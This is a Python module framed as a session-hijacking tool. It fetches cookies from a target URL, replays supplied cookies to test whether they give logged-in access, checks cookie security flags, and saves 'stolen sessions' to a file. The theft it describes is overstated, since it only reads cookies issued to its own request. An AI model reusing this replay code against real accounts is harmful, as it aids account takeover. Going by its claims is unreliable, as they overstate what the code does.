#!/usr/bin/env python3
"""
Session Hijacking Module
This module provides functionality to hijack active sessions by stealing and
manipulating session cookies, tokens, and other authentication mechanisms.
"""

import requests
import logging
import json
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class SessionHijacker:
    """
    Class to perform session hijacking attacks
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.stolen_sessions = []
    
    def steal_session_cookies(self, target_url, headers=None):
        """
        Steal session cookies from a target URL by analyzing responses
        
        Args:
            target_url (str): Target URL to scan for session cookies
            headers (dict): Optional HTTP headers for the request
            
        Returns:
            dict: Session cookies found
        """
        try:
            if headers is None:
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            
            response = self.session.get(target_url, headers=headers, timeout=10)
            response.raise_for_status()
            
            # Extract cookies from response
            cookies = dict(response.cookies)
            logger.info(f"Found {len(cookies)} cookies on {target_url}")
            
            # Identify potential session cookies
            session_cookies = {}
            session_keywords = ['session', 'token', 'auth', 'login', 'cookie']
            
            for cookie_name, cookie_value in cookies.items():
                if any(keyword in cookie_name.lower() for keyword in session_keywords):
                    session_cookies[cookie_name] = cookie_value
                    logger.info(f"Found session cookie: {cookie_name}")
            
            if session_cookies:
                self.stolen_sessions.append({
                    'url': target_url,
                    'cookies': session_cookies,
                    'timestamp': response.headers.get('Date')
                })
            
            return session_cookies
            
        except Exception as e:
            logger.error(f"Error stealing session cookies from {target_url}: {e}")
            return {}
    
    def hijack_session(self, target_url, cookies, headers=None):
        """
        Hijack a session using stolen cookies
        
        Args:
            target_url (str): Target URL to hijack session on
            cookies (dict): Stolen session cookies
            headers (dict): Optional HTTP headers for the request
            
        Returns:
            bool: True if session hijacking succeeded
        """
        try:
            if headers is None:
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            
            # Set the stolen cookies in the session
            for cookie_name, cookie_value in cookies.items():
                self.session.cookies.set(cookie_name, cookie_value)
            
            # Test if the session is valid
            response = self.session.get(target_url, headers=headers, timeout=10)
            response.raise_for_status()
            
            # Check if we're authenticated (simple heuristic)
            if self._is_authenticated(response):
                logger.info("Session hijacking successful!")
                return True
            else:
                logger.warning("Session cookies are invalid or expired")
                return False
                
        except Exception as e:
            logger.error(f"Error hijacking session on {target_url}: {e}")
            return False
    
    def _is_authenticated(self, response):
        """
        Check if the response indicates authenticated status
        
        Args:
            response (requests.Response): Response object from target
            
        Returns:
            bool: True if user appears to be authenticated
        """
        # Look for indicators of authentication
        authenticated_indicators = [
            'logout', 'dashboard', 'profile', 'account',
            'welcome', 'user', 'my account'
        ]
        
        response_text = response.text.lower()
        
        for indicator in authenticated_indicators:
            if indicator in response_text:
                return True
        
        return False
    
    def scan_for_session_vulnerabilities(self, target_url, headers=None):
        """
        Scan for session management vulnerabilities
        
        Args:
            target_url (str): Target URL to scan
            headers (dict): Optional HTTP headers for the request
            
        Returns:
            list: Vulnerabilities found
        """
        vulnerabilities = []
        
        try:
            if headers is None:
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            
            # Check for cookie security flags
            response = self.session.get(target_url, headers=headers, timeout=10)
            response.raise_for_status()
            
            cookies = response.cookies
            
            for cookie in cookies:
                # Check if cookie has Secure flag
                if not cookie.secure:
                    vulnerabilities.append({
                        'type': 'Cookie without Secure flag',
                        'cookie': cookie.name,
                        'description': 'Cookie is transmitted over HTTP'
                    })
                
                # Check if cookie has HttpOnly flag
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    vulnerabilities.append({
                        'type': 'Cookie without HttpOnly flag',
                        'cookie': cookie.name,
                        'description': 'Cookie accessible via JavaScript'
                    })
                
                # Check if cookie has SameSite attribute
                if not cookie.has_nonstandard_attr('SameSite'):
                    vulnerabilities.append({
                        'type': 'Cookie without SameSite attribute',
                        'cookie': cookie.name,
                        'description': 'Cookie vulnerable to CSRF attacks'
                    })
            
            logger.info(f"Found {len(vulnerabilities)} session management vulnerabilities")
            return vulnerabilities
            
        except Exception as e:
            logger.error(f"Error scanning for session vulnerabilities on {target_url}: {e}")
            return []
    
    def get_stolen_sessions(self):
        """
        Get all stolen sessions
        
        Returns:
            list: List of stolen sessions
        """
        return self.stolen_sessions
    
    def save_sessions(self, filename):
        """
        Save stolen sessions to a file
        
        Args:
            filename (str): Output filename
        """
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.stolen_sessions, f, indent=2, ensure_ascii=False)
            logger.info(f"Sessions saved to {filename}")
        except Exception as e:
            logger.error(f"Error saving sessions: {e}")


# Module entry point for testing
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='Session Hijacking Module')
    parser.add_argument('url', help='Target URL to scan for sessions')
    parser.add_argument('-o', '--output', help='Output file to save stolen sessions')
    
    args = parser.parse_args()
    
    hijacker = SessionHijacker()
    
    print("Scanning for session cookies...")
    cookies = hijacker.steal_session_cookies(args.url)
    
    if cookies:
        print(f"Found {len(cookies)} session cookies:")
        for cookie_name, cookie_value in cookies.items():
            print(f"  {cookie_name}: {cookie_value}")
        
        print("\nChecking session vulnerabilities...")
        vulnerabilities = hijacker.scan_for_session_vulnerabilities(args.url)
        if vulnerabilities:
            print(f"Found {len(vulnerabilities)} vulnerabilities:")
            for vuln in vulnerabilities:
                print(f"  - {vuln['type']} ({vuln['cookie']}): {vuln['description']}")
        
        if args.output:
            hijacker.save_sessions(args.output)
            print(f"\nSessions saved to {args.output}")
    else:
        print("No session cookies found")
